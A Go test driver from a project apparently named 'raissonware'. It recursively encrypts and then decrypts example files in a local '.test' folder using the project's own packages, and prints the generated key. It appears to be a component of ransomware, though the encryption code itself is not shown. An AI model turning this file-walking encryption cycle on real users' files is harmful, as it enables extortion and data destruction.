package main

import (
	"fmt"
	"os"
	"raissonware/pkg/cryptography"
	"raissonware/pkg/filesystem"
	"sync"
)

var wg sync.WaitGroup

const (
	testingFolder   = ".test"
	exampleFileName = "example.txt"
	fileText        = "this is an example file"
)

func main() {
	err := os.RemoveAll(".test")
	if err != nil {
		panic(err)
	}

	testingPath, err := createDotTest([]string{"1", "2", "3"})
	if err != nil {
		panic(err)
	}

	secretKey, nonce, err := cryptography.KeyGenAndInit()
	if err != nil {
		panic(err)
	}

	chanErr := make(chan error)

	// test client

	wg.Add(1)
	go filesystem.FindFiles(testingPath, cryptography.Encrypt, &wg, chanErr)

	wg.Wait()

	if len(chanErr) != 0 {
		for err = range chanErr {
			fmt.Println(err)
		}
	}

	// test unlocker

	wg.Add(1)
	go filesystem.FindFiles(testingPath, cryptography.Decrypt, &wg, chanErr)

	wg.Wait()

	if len(chanErr) != 0 {
		for err = range chanErr {
			fmt.Println(err)
		}
	}

	fmt.Println(secretKey, nonce)
}
